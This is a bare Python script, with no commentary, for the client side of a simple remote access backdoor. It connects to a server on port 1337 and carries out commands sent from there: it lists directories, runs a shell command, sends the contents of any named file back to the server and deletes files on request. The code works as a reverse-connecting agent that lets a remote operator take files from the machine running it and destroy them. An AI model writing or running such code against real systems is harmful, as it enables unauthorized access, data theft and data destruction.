import os, socket, subprocess

s = socket.socket()
port = 1337
host = input(str("Please enter the server to connected: "))
s.connect((host, port))
print('')
print('Connected to the host successfully')
print('')

running = True
while running:
    command = s.recv(1024)
    command = command.decode()
    print("Command received")
    print('')
    if command == "cwd":
        cwd = os.getcwd()
        cwd = str(cwd)
        s.send(cwd.encode())
        print("Command has been executed successfully!")

    elif command == "ls":
        vfiles = os.listdir()
        vfiles = str(vfiles)
        s.send(vfiles.encode())
        print("Command has been executed successfully!")

    elif command == "dir":
        vdir = subprocess.run(["dir"], shell=True, capture_output=True, text=False)
        vdir = str(vdir)
        s.send(vdir.encode())
        print("Command has been executed successfully!")

    elif command == "cd":
        csdir = s.recv(5000)
        csdir = csdir.decode()
        files = os.listdir(csdir)
        files = str(files)
        s.send(files.encode())
        print("\nCommand has been execued successfully!\n ")

    elif command == "df":
        filepath = s.recv(2048)
        filepath = filepath.decode()
        file = open(filepath, "rb")
        data = file.read()
        s.send(data)
        file.close()
        print("Sent successfully")

    elif command == "rmf":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("\nCommand executed successfully!\n")

    elif command == "exit":
        running = False

    else:
        print("")
        print("Command not recognised")